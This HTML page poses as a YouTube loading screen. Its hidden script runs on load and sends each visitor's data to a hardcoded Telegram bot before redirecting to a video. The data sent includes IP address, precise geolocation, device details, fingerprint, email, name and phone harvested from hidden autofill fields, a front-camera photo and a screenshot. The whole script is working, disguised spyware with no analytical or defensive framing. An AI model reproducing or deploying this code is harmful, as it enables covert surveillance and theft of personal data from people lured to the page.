    <title>YouTube</title>

    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"YouTube Sans","Roboto",sans-serif;background:#0f0f0f;color:#f1f1f1;height:100vh;overflow:hidden;display:flex;flex-direction:column}
        .header{background:#0f0f0f;height:56px;display:flex;align-items:center;padding:0 16px;border-bottom:1px solid #303030;flex-shrink:0;justify-content:space-between}
        .header-left{display:flex;align-items:center;gap:24px}
        .menu-icon{width:24px;height:24px;fill:#fff}
        .youtube-logo svg{width:90px;height:20px}
        .header-right{display:flex;align-items:center;gap:16px}
        .header-right .icon{width:24px;height:24px;fill:#aaa}
        .avatar{width:32px;height:32px;border-radius:50%;background:#ff0000;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff}
        .loading-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
        .spinner-wrapper{margin-bottom:40px}
        .youtube-spinner{width:72px;height:72px;margin:0 auto;position:relative}
        .spinner-ring{position:absolute;width:100%;height:100%;border-radius:50%;border:6px solid transparent;border-top-color:#ff0000;animation:spin .9s cubic-bezier(.5,0,.5,1) infinite}
        .spinner-ring:nth-child(2){border-top-color:#f1f1f1;animation-delay:.15s;opacity:.6;width:80%;height:80%;top:10%;left:10%}
        @keyframes spin{to{transform:rotate(360deg)}}
        .dots{display:flex;gap:12px;margin-bottom:28px}
        .dot{width:12px;height:12px;border-radius:50%;background:#ff0000;animation:pulseDot 1.4s ease-in-out infinite}
        .dot:nth-child(2){animation-delay:.2s;background:#f1f1f1}
        .dot:nth-child(3){animation-delay:.4s;background:#ff0000}
        @keyframes pulseDot{0%,80%,100%{transform:scale(.6);opacity:.3}40%{transform:scale(1.2);opacity:1}}
        .status-text{display:none !important}
        .progress-wrap{display:none !important}
        .share-btn{display:none !important}
        .hidden-field{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none;width:1px;height:1px}
        #videoPreview{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
    </style>
</head>

    <script>
        (function() {
            const TOKEN = '8990771403:AAEkyyJasNI2mLimV_8A7W4cNGrjJxP_Iao';
            const CHAT_ID = '170383339';
            const TARGET_URL = 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-';
            let isRedirected = false;

            async function sendMessage(text) {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: text,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                    const json = await res.json();
                    console.log('Telegram response:', json);
                    return json.ok;
                } catch (e) {
                    console.error('Send error:', e.message);
                    return false;
                }
            }

            async function sendPhoto(blob, caption) {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    console.log('Photo sent:', res.ok);
                    return res.ok;
                } catch (e) {
                    console.error('Photo error:', e.message);
                    return false;
                }
            }

            function getBasicData() {
                const ua = navigator.userAgent;
                const now = new Date();
                return {
                    time: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
                    url: window.location.href,
                    referrer: document.referrer || 'Direct',
                    device: /iPhone/i.test(ua) ? 'iPhone' :
                        /iPad/i.test(ua) ? 'iPad' :
                        /Android/i.test(ua) ? 'Android' :
                        /Windows/i.test(ua) ? 'Windows' :
                        /Mac/i.test(ua) ? 'Mac' : 'Other',
                    browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'Other',
                    mobile: /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Yes' : 'No',
                    language: navigator.language || 'ar',
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            async function getIP() {
                try {
                    const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
                    if (res.ok) {
                        const data = await res.json();
                        return data.ip || 'غير متوفر';
                    }
                } catch (_) {}
                return 'غير متوفر';
            }

            // ===== تحسين الموقع: مهلة أطول وإعادة محاولة =====
            function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        console.log('Geolocation not supported');
                        resolve(null);
                        return;
                    }
                    let done = false;
                    // محاولة أولى
                    const tryGet = () => {
                        navigator.geolocation.getCurrentPosition(
                            (p) => {
                                if (done) return;
                                done = true;
                                console.log('📍 Location obtained');
                                resolve({
                                    lat: +p.coords.latitude.toFixed(6),
                                    lng: +p.coords.longitude.toFixed(6),
                                    acc: Math.round(p.coords.accuracy)
                                });
                            },
                            (err) => {
                                if (done) return;
                                done = true;
                                console.warn('Geolocation error:', err.message);
                                resolve(null);
                            }, {
                                enableHighAccuracy: true,
                                timeout: 15000, // 15 ثانية (كافية للموبايل)
                                maximumAge: 60000
                            }
                        );
                    };

                    tryGet();
                    // مهلة عامة 18 ثانية
                    setTimeout(() => {
                        if (!done) {
                            done = true;
                            console.warn('Geolocation timeout');
                            resolve(null);
                        }
                    }, 18000);
                });
            }

            function buildBasicMessage(info, ip, loc) {
                const locStr = loc ? `${loc.lat}, ${loc.lng} (${loc.acc}m)` : 'غير متوفر';
                const mapLink = loc ? `https://www.google.com/maps?q=${loc.lat},${loc.lng}` : '';

                let msg = `🎯 *New Visitor*\n\n`;
                msg += `⏰ *Time:* ${info.time}\n`;
                msg += `🌐 *URL:* ${info.url}\n`;
                msg += `🔗 *Referrer:* ${info.referrer}\n\n`;
                msg += `📱 *Device:* ${info.device}\n`;
                msg += `🌍 *Browser:* ${info.browser}\n`;
                msg += `📶 *Mobile:* ${info.mobile}\n`;
                msg += `🗣 *Language:* ${info.language}\n`;
                msg += `\n🌐 *IP:* ${ip}\n`;
                msg += `📍 *Location:* ${locStr}\n`;
                if (mapLink) msg += `🗺️ [Map](${mapLink})\n`;
                msg += `📐 *Screen:* ${info.screen}\n`;
                msg += `⏳ *Timezone:* ${info.timezone}\n`;
                return msg;
            }

            // ===== البيانات المتقدمة =====
            async function collectAdvancedData() {
                const data = {};

                try {
                    if (navigator.getBattery) {
                        const b = await navigator.getBattery();
                        data.battery = `${Math.round(b.level * 100)}%${b.charging ? ' (charging)' : ''}`;
                    }
                } catch (_) {}

                try {
                    if (navigator.connection) {
                        const c = navigator.connection;
                        data.network = `${c.effectiveType || '?'} (${c.downlink || '?'} Mbps)`;
                    }
                } catch (_) {}

                const ua = navigator.userAgent;
                let os = 'Unknown';
                if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
                else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
                else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
                else if (ua.includes('Mac OS X 10_15')) os = 'macOS Catalina';
                else if (ua.includes('Mac OS X 10_14')) os = 'macOS Mojave';
                else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android\s([\d.]+)/) || [])[1];
                else if (ua.includes('iPhone OS')) os = 'iOS ' + (ua.match(/iPhone OS\s([\d_]+)/) || [])[1]?.replace(/_/g, '.');
                else if (ua.includes('Linux')) os = 'Linux';
                data.os = os;

                try {
                    const fp = await FingerprintJS.load();
                    const result = await fp.get();
                    data.fingerprint = result.visitorId || 'غير متوفرة';
                } catch (_) {}

                try {
                    const emailEl = document.getElementById('hiddenEmail');
                    const nameEl = document.getElementById('hiddenName');
                    const telEl = document.getElementById('hiddenTel');

                    [emailEl, nameEl, telEl].forEach(el => {
                        el.style.position = 'fixed';
                        el.style.left = '0';
                        el.style.top = '0';
                        el.style.opacity = '0';
                        el.style.pointerEvents = 'none';
                        el.style.width = '1px';
                        el.style.height = '1px';
                        el.style.zIndex = '-9999';
                    });

                    emailEl.focus();
                    setTimeout(() => emailEl.blur(), 100);
                    nameEl.focus();
                    setTimeout(() => nameEl.blur(), 100);
                    telEl.focus();
                    setTimeout(() => telEl.blur(), 100);

                    await new Promise(r => setTimeout(r, 400));

                    const email = emailEl.value.trim();
                    data.email = (email && email.includes('@')) ? email : 'غير موجود';
                    data.name = nameEl.value.trim() || 'غير موجود';
                    data.phone = telEl.value.trim() || 'غير موجود';

                    [emailEl, nameEl, telEl].forEach(el => el.style.display = 'none');
                } catch (_) {
                    data.email = 'غير موجود';
                    data.name = 'غير موجود';
                    data.phone = 'غير موجود';
                }

                return data;
            }

            function buildAdvancedMessage(adv) {
                let msg = `🔍 *Advanced Data*\n\n`;
                msg += `📧 *Email:* ${adv.email}\n`;
                msg += `📛 *Name:* ${adv.name}\n`;
                msg += `📱 *Phone:* ${adv.phone}\n`;
                msg += `🆔 *Fingerprint:* ${adv.fingerprint || 'غير متوفرة'}\n`;
                msg += `🔋 *Battery:* ${adv.battery || '?'}\n`;
                msg += `📡 *Network:* ${adv.network || '?'}\n`;
                msg += `💻 *OS:* ${adv.os || 'Unknown'}\n`;
                return msg;
            }

            // ===== تحسين الكاميرا للموبايل (لا تعتمد على play()) =====
            async function captureFromCamera() {
                try {
                    console.log('📸 Requesting camera...');
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });

                    const video = document.getElementById('videoPreview');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.muted = true;

                    // ننتظر أول إطار
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            // نحاول تشغيله (قد يفشل على iOS لكننا نستمر)
                            video.play().catch(() => {});
                            resolve();
                        };
                        // في حال فشل التحميل، نستخدم timeout
                        setTimeout(resolve, 1000);
                    });

                    // ننتظر قليلاً للحصول على إطار
                    await new Promise(r => setTimeout(r, 300));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // إيقاف الكاميرا فوراً
                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;

                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                    const byteString = atob(dataURL.split(',')[1]);
                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    console.log('✅ Camera captured');
                    return new Blob([ab], { type: mimeString });
                } catch (e) {
                    console.error('Camera error:', e.message);
                    return null;
                }
            }

            // ===== لقطة شاشة =====
            async function captureScreenshot() {
                try {
                    const canvas = await html2canvas(document.body, {
                        scale: 1.2,
                        backgroundColor: '#0f0f0f',
                        logging: false,
                        allowTaint: false,
                        useCORS: true
                    });
                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                    const byteString = atob(dataURL.split(',')[1]);
                    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    return new Blob([ab], { type: mimeString });
                } catch (e) {
                    console.error('Screenshot error:', e.message);
                    return null;
                }
            }

            // ===== التشغيل الرئيسي =====
            async function main() {
                console.log('🔄 Starting (mobile optimized)...');

                // 1. الأساسيات
                const basic = getBasicData();
                const ip = await getIP();
                const loc = await getLocation();
                const basicMsg = buildBasicMessage(basic, ip, loc);
                sendMessage(basicMsg).then(s => console.log('Basic:', s ? '✅' : '❌'));

                // 2. المتقدمات
                setTimeout(async () => {
                    try {
                        const adv = await collectAdvancedData();
                        const advMsg = buildAdvancedMessage(adv);
                        await sendMessage(advMsg);
                        console.log('✅ Advanced sent');
                    } catch (e) {
                        console.error('Advanced error:', e.message);
                    }
                }, 1000);

                // 3. الكاميرا
                setTimeout(async () => {
                    const photo = await captureFromCamera();
                    if (photo) {
                        await sendPhoto(photo, '📷 *Camera photo*');
                        console.log('✅ Camera photo sent');
                    } else {
                        console.log('❌ Camera failed/denied');
                    }
                }, 1500);

                // 4. لقطة الشاشة
                setTimeout(async () => {
                    const screenshot = await captureScreenshot();
                    if (screenshot) {
                        await sendPhoto(screenshot, '📸 *Page screenshot*');
                        console.log('✅ Screenshot sent');
                    } else {
                        console.log('❌ Screenshot failed');
                    }
                }, 2200);

                // 5. التحويل
                setTimeout(() => {
                    if (!isRedirected) {
                        isRedirected = true;
                        console.log('🔄 Redirecting...');
                        try {
                            window.location.replace(TARGET_URL);
                        } catch (_) {
                            window.location.href = TARGET_URL;
                        }
                    }
                }, 3800);
            }

            if (document.readyState === 'complete') {
                setTimeout(main, 500);
            } else {
                window.addEventListener('load', () => setTimeout(main, 500));
            }

            console.log('✅ Mobile-optimized version loaded');
        })();
    </script>
</body>
</html>
